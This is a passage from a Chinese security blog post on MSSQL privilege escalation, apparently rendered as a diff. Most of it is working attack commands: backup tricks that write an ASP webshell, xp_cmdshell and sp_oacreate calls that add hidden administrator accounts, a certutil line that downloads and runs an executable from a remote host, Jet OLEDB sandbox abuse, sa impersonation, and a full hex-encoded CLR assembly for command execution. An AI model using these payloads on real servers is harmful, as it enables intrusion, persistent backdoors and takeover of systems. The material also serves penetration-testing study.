+insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 
+
+# 将操作日志备份进asp中
+backup log 库名 to disk = 'c:\xxx\2.asp'
+
+# 删除掉cmd表
+drop table cmd; 
+</code></pre><h4 id="差异备份">差异备份</h4>
+<p>利用差异备份的条件：</p>
+<ul>
+<li>知晓网站根路径<strong>且可写</strong></li>
+<li>支持堆叠注入</li>
+</ul>
+<pre tabindex="0"><code># 完整备份一次(保存位置可以改)
+backup database 库名 to disk = 'c:\bak.bak';--
+
+create table cmd (a image);
+
+# 创建表 cmd 并插入一句话木马
+insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E);
+
+# 进行差异备份(只备份变化的部分)
+backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;
+</code></pre><h3 id="xp_cmdshell">xp_cmdshell</h3>
+<ul>
+<li>测试 xp_cmdshell 是否可以执行</li>
+</ul>
+<pre tabindex="0"><code>exec master..xp_cmdshell 'ver'
+或
+execute('xp_cmdshell &quot;whoami&quot;') 
+</code></pre><ul>
+<li>添加管理员获取控制权</li>
+</ul>
+<pre tabindex="0"><code>exec master.dbo.xp_cmdshell 'net user hack hack123456 /add'
+exec master.dbo.xp_cmdshell 'net localgroup administrators hack /add'
+</code></pre><ul>
+<li>下载远程马，上线获取控制权</li>
+</ul>
+<pre tabindex="0"><code>exec master.dbo.xp_cmdshell 'cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe';
+
+exec master.dbo.xp_cmdshell 'cd c:\www &amp; file.exe';
+</code></pre><blockquote>
+<p>Certutil 是一个 CLI 程序，可用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA 组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装。</p>
+<p>Certutil 是 Windows 操作系统上预装的工具，可用于 校验文件MD5、SHA1、SHA256，下载恶意文件和免杀。</p>
+</blockquote>
+<h3 id="sp_oacreate">sp_oacreate</h3>
+<p>当xp_cmdshell出问题时，也可考虑用sp_oacreate。</p>
+<p>sp_oacreate可以删除、复制、移动文件，还能配合sp_oamethod来写文件执行cmd，不过这种方式没有回显。</p>
+<blockquote>
+<p>注：</p>
+<p>所有涉及到写入的操作都需要根据当前用户是否有权限。</p>
+</blockquote>
+<ul>
+<li>当被阻止时，可开启该过程</li>
+</ul>
+<pre tabindex="0"><code>EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE
+</code></pre><ul>
+<li>恢复</li>
+</ul>
+<pre tabindex="0"><code>exec sp_configure 'show advanced options',1;reconfigure;
+exec sp_configure 'ole automation procedures',0;reconfigure;
+exec sp_configure 'show advanced options',0;reconfigure;
+</code></pre><p><strong>利用：</strong></p>
+<ul>
+<li>调用cmd写用户</li>
+</ul>
+<pre tabindex="0"><code># wscript.shell 执行命令
+declare @shell int 
+exec sp_oacreate 'wscript.shell',@shell output 
+exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user hack Password@ /add'
+
+# Shell.Application 执行命令
+declare @o int
+exec sp_oacreate 'Shell.Application', @o out
+exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user &gt;c:\test.txt','c:\windows\system32','','1';
+</code></pre><ul>
+<li>启动项写用户</li>
+</ul>
+<pre tabindex="0"><code>declare @sp_passwordxieo int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out
+exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\RECYCLER\1.vbs', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(&quot;user&quot;,&quot;123$&quot;)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword &quot;123&quot;'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&amp;&quot;/123$&quot;,user)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&amp;&quot;/123$&quot;';
+</code></pre><ul>
+<li>知晓路径并可写情况下，也可以将命令执行结果写入网站目录下，再去读取该文件即可</li>
+</ul>
+<pre tabindex="0"><code>declare @shell int;
+exec sp_oacreate 'wscript.shell',@shell output;
+exec sp_oamethod @shell,'run',null,'C:\\windows\\system32\\cmd.exe /c whoami &gt; C:\\Inetpub\\wwwroot\\tmp.txt';
+</code></pre><h3 id="sandbox提权">sandbox提权</h3>
+<p>沙盒模式SandBoxMode是一种安全功能。在沙盒模式下，Access只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p>
+<p>例如，诸如Kill和Shell之类的函数可能被用来损坏计算机上的数据和文件，因此它们被视为不安全的。</p>
+<blockquote>
+<p>沙盒提权的原理就是<code>jet.oledb</code>（修改注册表）执行系统命令。数据库通过查询方式调用<code>mdb</code>文件，执行参数，绕过系统本身自己的执行命令，实现<code>mdb</code>文件执行命令。</p>
+</blockquote>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li><code>xp_regwrite</code> 可用(一般就是SA权限)</li>
+<li>需要<code>Microsoft.Jet.OLEDB.4.0</code>一般在32位系统才可以，64位机需要12.0，较复杂</li>
+<li><code>dnary.mdb</code>和<code>ias.mdb</code>两个文件 在<code>win2003</code>上默认存在，也可自行准备</li>
+</ul>
+<p><strong>利用：</strong></p>
+<ul>
+<li>开启Ad Hoc Distributed Queries组件</li>
+</ul>
+<pre tabindex="0"><code>exec sp_configure 'show advanced options',1 ;
+reconfigure ;
+exec sp_configure 'Ad Hoc Distributed Queries',1 ;
+reconfigure;
+</code></pre><ul>
+<li>恢复对注册表的读写</li>
+</ul>
+<pre tabindex="0"><code>dbcc addextendedproc ('xp_regread','xpstar.dll')
+dbcc addextendedproc ('xp_regwrite','xpstar.dll')
+</code></pre><ul>
+<li>开启沙盒模式</li>
+</ul>
+<pre tabindex="0"><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
+</code></pre><blockquote>
+<p>参数<code>0</code>的含义：</p>
+<p><code>0</code>：在任何所有者中禁止启用安全模式</p>
+<p><code>1</code> ：为仅在允许范围内</p>
+<p><code>2</code> ：必须在access模式下</p>
+<p><code>3</code>：完全开启</p>
+</blockquote>
+<ul>
+<li>利用 jet.oledb 执行系统命令写用户</li>
+</ul>
+<pre tabindex="0"><code>select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\windows\system32\ias\ias.mdb' ,'select shell(&quot;cmd.exe /c net user hack hack123456 /add&quot;)')
+
+select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\windows\system32\ias\ias.mdb' ,'select shell(&quot;cmd.exe /c net localgroup administrators hack /add&quot;)')
+</code></pre><h3 id="mssql-模拟登录提权">MSSQL 模拟登录提权</h3>
+<p>该漏洞属于配置不当，开发者允许其他登录用户模拟高权限的用户。</p>
+<h4 id="赋予某用户模拟登录权限">赋予某用户模拟登录权限</h4>
+<pre tabindex="0"><code># 赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa
+USE master;
+GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
+GO
+</code></pre><h4 id="查找可模拟登录的用户">查找可模拟登录的用户</h4>
+<p>以MyUser1登录后，执行查询：</p>
+<pre tabindex="0"><code>SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 96; 
+			flex-basis: 231px"
+	>
+	<a href="/p/mssql/image-20220218203850110.png" data-size="396x411">
+		<img src="/p/mssql/image-20220218203850110.png"
+			width="396"
+			height="411"
+			srcset="/p/mssql/image-20220218203850110_hu442e083d4c4038e4c66c78e9c0f9f603_72032_480x0_resize_box_3.png 480w, /p/mssql/image-20220218203850110_hu442e083d4c4038e4c66c78e9c0f9f603_72032_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="模拟用户登录">模拟用户登录</h4>
+<pre tabindex="0"><code># 验证模拟前是否为sysadmin权限
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+# 模拟sa登录
+EXECUTE AS LOGIN = 'sa'
+
+# 模拟登录后验证是否为sysadmin权限
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 93; 
+			flex-basis: 224px"
+	>
+	<a href="/p/mssql/image-20220218203959097.png" data-size="360x385">
+		<img src="/p/mssql/image-20220218203959097.png"
+			width="360"
+			height="385"
+			srcset="/p/mssql/image-20220218203959097_hu620b363247213289f5b9e80eee93b3c4_76207_480x0_resize_box_3.png 480w, /p/mssql/image-20220218203959097_hu620b363247213289f5b9e80eee93b3c4_76207_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="clr提权">CLR提权</h3>
+<p>SQL CLR 是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，让 SQL Server 的部分数据库对象可以使用 .NET Framework 的编程语言进行开发(目前只支持VB.NET和C#)，包括存储过程、用户自定义函数、触发器、 用户自定义类型以及用户自定义聚合函数等功能。</p>
+<h4 id="使用clr执行系统命令">使用CLR执行系统命令</h4>
+<pre tabindex="0"><code>#启用MSSQL CLR功能
+exec sp_configure 'show advanced options', 1;
+RECONFIGURE;
+Exec sp_configure 'clr enabled', 1;
+RECONFIGURE;
+ 
+#为了导入了不安全的程序集，我们还需要将数据库标记为安全。
+ALTER DATABASE [master] SET TRUSTWORTHY ON;
+ 
+#导入程序集，单独执行
+CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;
+
+#创建存储过程,单独执行
+CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;
+
+#执行命令
+EXEC sp_cmdExec 'whoami';
+
+#删除该程序集
+DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-3/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-3"
+                        data-key="php-3" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-3</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#sql-server简介">SQL Server简介</a>
+      <ol>
+        <li><a href="#系统数据库">系统数据库</a></li>
+        <li><a href="#sysobjects表字段">sysobjects表字段</a></li>
+      </ol>
+    </li>
+    <li><a href="#sql-server-信息收集">SQL Server 信息收集</a>
+      <ol>
+        <li><a href="#权限判断">权限判断</a>
+          <ol>
+            <li><a href="#服务器级别角色">服务器级别角色</a></li>
+            <li><a href="#数据库级别角色">数据库级别角色</a></li>
+          </ol>
+        </li>
+        <li><a href="#基本信息获取">基本信息获取</a></li>
+        <li><a href="#站库分离判断">站库分离判断</a></li>
+      </ol>
+    </li>
+    <li><a href="#sql-server-基本语法">SQL Server 基本语法</a>
+      <ol>
+        <li><a href="#注释与空白符">注释与空白符</a></li>
+        <li><a href="#运算符">运算符</a></li>
+      </ol>
+    </li>
+    <li><a href="#mssql-注入">MSSQL 注入</a>
+      <ol>
+        <li><a href="#显错注入">显错注入</a>
+          <ol>
+            <li><a href="#原理">原理</a></li>
+            <li><a href="#利用">利用</a></li>
+            <li><a href="#简单绕过">简单绕过</a></li>
+          </ol>
+        </li>
+        <li><a href="#盲注">盲注</a>
+          <ol>
+            <li><a href="#bool盲注">bool盲注</a></li>
+            <li><a href="#时间型盲注">时间型盲注</a></li>
+          </ol>
+        </li>
+        <li><a href="#联合注入">联合注入</a>
+          <ol>
+            <li><a href="#利用-1">利用</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#mssql-提权">MSSQL 提权</a>
+      <ol>
+        <li><a href="#备份拿shell">备份拿shell</a>
+          <ol>
+            <li><a href="#寻找路径">寻找路径</a></li>
+            <li><a href="#log备份">Log备份</a></li>
+            <li><a href="#差异备份">差异备份</a></li>
+          </ol>
+        </li>
+        <li><a href="#xp_cmdshell">xp_cmdshell</a></li>
+        <li><a href="#sp_oacreate">sp_oacreate</a></li>
+        <li><a href="#sandbox提权">sandbox提权</a></li>
+        <li><a href="#mssql-模拟登录提权">MSSQL 模拟登录提权</a>
+          <ol>
+            <li><a href="#赋予某用户模拟登录权限">赋予某用户模拟登录权限</a></li>
+            <li><a href="#查找可模拟登录的用户">查找可模拟登录的用户</a></li>
+            <li><a href="#模拟用户登录">模拟用户登录</a></li>
+          </ol>
